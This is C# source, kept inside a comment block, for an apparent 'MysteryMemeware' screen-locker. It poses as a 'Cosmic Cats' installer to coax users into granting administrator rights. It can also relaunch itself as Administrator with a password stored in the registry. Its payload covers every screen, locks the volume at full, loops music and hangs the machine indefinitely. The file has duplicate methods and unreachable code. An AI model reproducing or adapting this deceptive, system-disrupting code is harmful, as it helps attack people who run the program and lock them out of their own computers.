/*
using System;
using System.IO;
using System.Media;
using System.Drawing;
using System.Reflection;
using System.Diagnostics;
using System.Threading;
using System.Windows.Forms;

namespace MysteryMemeware
{
    public static class OldProgram
    {
        public static readonly string CurrentExePath = typeof(Program).Assembly.Location;
        public static readonly string CurrentExeFolder = Path.GetDirectoryName(CurrentExePath);
        public static readonly string System32Folder = StringHelper.ReplaceCaseless(Environment.GetFolderPath(Environment.SpecialFolder.System), "System32", "Sysnative");
        public static readonly string System64Folder = Environment.GetFolderPath(Environment.SpecialFolder.SystemX86);
        public static readonly string SystemFolder = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
        public const string MemeMusicResourceName = "MysteryMemeware.Assets.BackgroundSong.wav";
        public const string DisplayCoverImageResourceName = "MysteryMemeware.Assets.CoverImage.bmp";
        public static readonly string InstallLocation = SystemFolder + "\\Shell.exe";
        public const string IsInstalledRegistryPath = "Computer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\MysteryMemeware\\IsInstalled";
        public const string AdminPasswordRegistryPath = "Computer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\MysteryMemeware\\AdminPassword";
        public const string UserPasswordRegistryPath = "Computer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\MysteryMemeware\\UserPassword";
        public static readonly string[] trueStrings = new string[] { "true", "yes", "1", "y", "t" };
        #region Public Constants
        public const string BackgroundSongResourceName = "MysteryMemeware.Payload.Assets.BackgroundSong.wav";
        public const string CoverImageResourceName = "MysteryMemeware.Payload.Assets.CoverImage.bmp";
        public const string CoverImageWithFailSafeResourceName = "MysteryMemeware.Payload.Assets.CoverImageWithFailSafe.bmp";

        public const string AllowFailSafeRegistryPath = "Computer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\MysteryMemeware\\AllowFailSafe";

        public static readonly string AdminPassword = GetAdminPassword();
        private static string GetAdminPassword()
        {
            try
            {
                object adminPasswordObject = RegistryHelper.GetValue(AdminPasswordRegistryPath);
                if (adminPasswordObject.GetType() != typeof(string))
                {
                    throw new Exception("adminPasswordObject was in an invalid format.");
                }
                return (string)adminPasswordObject;
            }
            catch
            {
                return null;
            }
        }
        public static readonly bool AllowFailSafe = GetAllowFailSafe();
        private static bool GetAllowFailSafe()
        {
            try
            {
                object allowFailSafeObject = RegistryHelper.GetValue(AllowFailSafeRegistryPath);
                if (allowFailSafeObject.GetType() != typeof(int))
                {
                    throw new Exception("allowFailSafeObject was in an invalid format.");
                }
                return ((int)allowFailSafeObject) is 1;
            }
            catch
            {
                return false;
            }
        }
        #endregion
        [STAThread]
        public static void Main()
        {
            if (UACHelper.CurrentProcessIsAdmin)
            {
                Run();
            }
            else
            {
                try
                {
                    ElevateSelf();
                    return;
                }
                catch
                {
                    Run();
                }
            }
        }
        public static void ElevateSelf()
        {
            if (AdminPassword is null)
            {
                throw new Exception("Admin password could not be loaded.");
            }
            ProcessHelper.StartAs(PathHelper.CurrentExePath, "Administrator", AdminPassword, WindowMode.Default, PathHelper.CurrentExeDirectory);
            try
            {
                ProcessHelper.CurrentProcess.Kill();
            }
            catch
            {

            }
        }
        public static void Run()
        {
            try
            {
                VolumeModule.LockAtFull();
            }
            catch
            {

            }
            try
            {
                Assembly assembly = typeof(PayloadProgram).Assembly;
                try
                {
                    Stream coverImageStream;
                    if (AllowFailSafe)
                    {
                        coverImageStream = assembly.GetManifestResourceStream(CoverImageWithFailSafeResourceName);
                    }
                    else
                    {
                        coverImageStream = assembly.GetManifestResourceStream(CoverImageResourceName);
                    }
                    Image coverImage = Image.FromStream(coverImageStream);
                    ScreenCoverModule.CoverAllScreens(coverImage, false);
                }
                catch
                {

                }
                try
                {
                    Stream backgroundSongStream = assembly.GetManifestResourceStream(BackgroundSongResourceName);
                    SoundPlayer soundPlayer = new SoundPlayer(backgroundSongStream);
                    while (true)
                    {
                        try
                        {
                           // soundPlayer.PlaySync();
                        }
                        catch
                        {

                        }
                    }
                }
                catch
                {

                }
            }
            catch
            {

            }
            while (true)
            {

            }
        }
        [STAThread]
        public static void Main()
        {
            PhaseOne.Main();
            return;
            try
            {
                if (IsInstalled())
                {
                    if (UACHelper.CurrentProcessIsAdmin)
                    {
                        Run();
                    }
                    else
                    {
                        try
                        {
                            ElevateSelf();
                        }
                        catch
                        {
                            Run();
                        }
                    }
                }
                else
                {
                    if (UACHelper.CurrentProcessIsAdmin)
                    {
                        Install();
                    }
                    else
                    {
                        BegForAdmin();
                    }
                }
                Process.GetCurrentProcess().Kill();
            }
            catch (Exception ex)
            {
                string exMessage = "Unknown exception thrown.";
                if (ex is not null)
                {
                    exMessage = $"{ex.GetType().FullName} thrown at {ex.TargetSite.Name} with message {ex.Message}. {ex.StackTrace}";
                }
                MessageBox.Show(exMessage);
            }
        }
        public static bool IsInstalled()
        {
            try
            {
                object isInstalledObject = RegistryHelper.GetValue(IsInstalledRegistryPath);
                if (isInstalledObject is null)
                {
                    return false;
                }
                Type typeOfIsInstalled = isInstalledObject.GetType();
                if (typeOfIsInstalled == typeof(string))
                {
                    return StringHelper.MatchesArrayCaseless((string)isInstalledObject, trueStrings);
                }
                if (typeOfIsInstalled == typeof(long))
                {
                    return (long)isInstalledObject == 1;
                }
                if (typeOfIsInstalled == typeof(int))
                {
                    return (int)isInstalledObject == 1;
                }
                if (typeOfIsInstalled == typeof(bool))
                {
                    return (bool)isInstalledObject;
                }
                return false;
            }
            catch
            {
                return false;
            }
        }
        public static void ElevateSelf()
        {
            object adminPasswordObject = RegistryHelper.GetValue(AdminPasswordRegistryPath);
            if (adminPasswordObject is null || adminPasswordObject.GetType() != typeof(string))
            {
                throw new Exception("Failed to load admin password.");
            }
            string adminPassword = (string)adminPasswordObject;
            string currentExePath = CurrentExePath;
            ProcessHelper.StartAs(new TerminalCommand($"\"{currentExePath}\""), new UsernameDomainPair("Administrator"), adminPassword, WindowMode.Default, Path.GetDirectoryName(currentExePath));
        }
        public static void BegForAdmin()
        {
            if (MessageBox.Show("Cosmic Cats is not yet installed on your computer. Would you like to install it now?", "Install Cosmic Cats?", MessageBoxButtons.YesNo) == DialogResult.No)
            {
                return;
            }
            if (MessageBox.Show("Elevated permissions are required in order to install Cosmic Cats. Please select yes on the following popup to grant the neccessary permission, or you may select no to cancel the installation.", "Elevated Permissions Required.", MessageBoxButtons.OKCancel) == DialogResult.Cancel)
            {
                return;
            }
            string commonAppData = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData);
            string tempFolderPath = commonAppData + "\\" + 0.ToString();
            for (int i = 0; i < 10000; i++)
            {
                tempFolderPath = commonAppData + "\\" + i.ToString();
                if (!Directory.Exists(tempFolderPath))
                {
                    break;
                }
            }
            Directory.CreateDirectory(tempFolderPath);
            string tempFilePath = tempFolderPath + "\\CosmicCatsInstaller.exe";
            File.Copy(CurrentExePath, tempFilePath);
            try
            {
                ProcessHelper.Start(new TerminalCommand(tempFilePath, ""), WindowMode.Default, true, CurrentExeFolder);
            }
            catch (System.ComponentModel.Win32Exception win32ex)
            {
                if (win32ex.NativeErrorCode == 1223)
                {
                    MessageBox.Show("Elevated permissions denied. To install cosmic cats again later please run this application again and select yes when prompted.", "Elevated Permissions Denied.", MessageBoxButtons.OK);
                }
                else
                {
                    throw win32ex;
                }
            }
        }
        public static bool StringMatchesCaseless(string a, string b)
        {
            if (a is null && b is null)
            {
                return true;
            }
            if (a is null || b is null)
            {
                return false;
            }
            return a.ToUpper() == b.ToUpper();
        }
       
        public static void RunCommand(string filePath, string arguments, bool elevate = true)
        {
            ProcessHelper.AwaitSuccess(ProcessHelper.Start(new TerminalCommand(filePath, arguments), WindowMode.Hidden, elevate, Path.GetDirectoryName(filePath)), new TimeSpan(300000000), TimeoutAction.KillAndThrow, true);
        }
        public static void Run()
        {
            VolumeHelper.LockAtFull();

            ScreenCoverForm.CoverAllScreens(Image.FromStream(typeof(Program).Assembly.GetManifestResourceStream(DisplayCoverImageResourceName)), System.Drawing.Drawing2D.InterpolationMode.NearestNeighbor);

            SoundPlayer soundPlayer = new SoundPlayer(typeof(Program).Assembly.GetManifestResourceStream(MemeMusicResourceName));
            soundPlayer.PlayLooping();

            while (true)
            {
                Thread.Sleep(int.MaxValue);
            }
        }
    }
}
}
*/